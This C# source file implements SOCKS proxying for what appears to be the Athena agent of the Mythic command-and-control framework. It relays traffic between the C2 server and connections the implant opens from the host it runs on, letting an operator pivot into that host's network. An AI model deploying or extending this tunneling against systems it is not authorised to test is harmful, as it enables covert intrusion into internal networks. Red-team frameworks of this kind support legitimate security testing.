﻿using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{
    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, ConnectionOptions> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        private ConcurrentQueue<SocksMessage> messagesIn = new ConcurrentQueue<SocksMessage>();
        public bool running { get; set; }
        static object _lock = new object();
        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, ConnectionOptions>();
        }

        public bool Start()
        {
            this.ct = new CancellationTokenSource();
            try
            {
                Task.Run(() => { 
                    while (!this.ct.IsCancellationRequested)
                    {
                        try
                        {
                            ReadMythicMessages();
                        }
                        catch (Exception e)
                        {
                            Misc.WriteError(e.Message);
                            continue;
                        }
                    }
                });

                Task.Run(() => {
                    while (!this.ct.IsCancellationRequested)
                    {
                        try
                        {
                            ReadServerMessages();
                        }
                        catch (Exception e)
                        {
                            Misc.WriteError(e.Message);
                            continue;
                        }
                    }
                });
            }
            catch
            {
                this.Stop();
                return false;
            }
            return true;
        }

        public bool Stop()
        {
            try
            {
                this.running = false;
                if (this.ct is not null)
                {
                    this.ct.Cancel();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public List<SocksMessage> GetMessages()
        {
            List<SocksMessage> messagesOut;

            lock (_lock)
            {
                messagesOut = new List<SocksMessage>(this.messagesOut);
                this.messagesOut.Clear();
            }
            messagesOut.Reverse();
            return messagesOut;
        }

        public void AddToQueue(SocksMessage message)
        {
            this.messagesIn.Enqueue(message);
        }

        public void ReturnMessage(SocksMessage message)
        {
            if (Monitor.TryEnter(_lock, 5000))
            {
                this.messagesOut.Add(message);
                Monitor.Exit(_lock);
            }
        }

        //This function will take messages FROM mythic and forward them to the Server.
        //Client -> Mythic -> Athena -> Server
        private void ReadMythicMessages()
        {
            while (!this.ct.IsCancellationRequested)
            {
                SocksMessage sm;
                while (!messagesIn.TryDequeue(out sm)) { }
                Task.Run(() => { HandleMessage(sm); });
            }
        }

        public int Count()
        {
            return this.messagesOut.Count();
        }
        //This function will send messages from the Server TO mythic.
        //Server -> Athena -> Mythic -> Client
        private void ReadServerMessages()
        {
            while (!this.ct.IsCancellationRequested)
            {
                Parallel.ForEach(this.connections, connection =>
                {
                    try
                    {
                        if (!connection.Value.socket.Connected)
                        {
                            SocksMessage smOut = new SocksMessage()
                            {
                                server_id = connection.Key,
                                data = "",
                                exit = true
                            };

                            //Add to our messages queue.
                            ReturnMessage(smOut);
                            while (!this.connections.TryRemove(connection)) { };
                        }
                        else
                        {
                            if (connection.Value.socket.Available > 0)
                            {
                                List<byte[]> outMessages = connection.Value.receiveMessages();

                                foreach (var msg in outMessages)
                                {
                                    SocksMessage smOut = new SocksMessage()
                                    {
                                        server_id = connection.Value.server_id,
                                        data = Misc.Base64Encode(msg),
                                        exit = false
                                    };
                                    ReturnMessage(smOut);

                                }
                            }
                        }
                    }
                    catch (ObjectDisposedException)
                    {
                        //ConnectionOptions cn;
                        //while (!this.connections.TryRemove(connection.Key, out cn)) { }
                        //Misc.WriteDebug("Removed Connection.");
                    }
                });
            }
        }

        private void HandleMessage(SocksMessage sm)
        {
            //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
            //Should I be doing this?

            if (this.connections.ContainsKey(sm.server_id))
            {
                var conn = this.connections[sm.server_id];
                if (sm.exit)
                {
                    this.connections[sm.server_id].socket.Dispose();
                    while (!this.connections.TryRemove(sm.server_id, out conn)) { };
                    return;
                }

                //We already know about this connection, so let's just forward the data.
                if (!this.connections[sm.server_id].ForwardPacket(sm))
                {
                    Misc.WriteDebug("Failed to foward packet.");
                    //Do Something
                }
            }
            else
            {
                ConnectionOptions cn = new ConnectionOptions(sm);
                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id
                };
                ConnectResponse cr = new ConnectResponse();

                if (cn.connected)
                {
                    this.connections.AddOrUpdate(sm.server_id, cn, (key, oldValue) => cn);
                    cr.status = ConnectResponseStatus.Success;
                    smOut.exit = false;
                }
                else
                {
                    cr.status = ConnectResponseStatus.GeneralFailure;
                    smOut.exit = true;
                }

                cr.bndaddr = cn.bndBytes ?? new byte[] { 0x01, 0x00, 0x00, 0x7F };
                cr.bndport = cn.bndPortBytes ?? new byte[] { 0x00, 0x00 };
                cr.addrtype = cn.addressType;

                //Put our ConnectResponse into the SocksMessage
                smOut.data = Misc.Base64Encode(cr.ToByte());

                //Add to our message queue
                ReturnMessage(smOut);
            }
        }
    }
}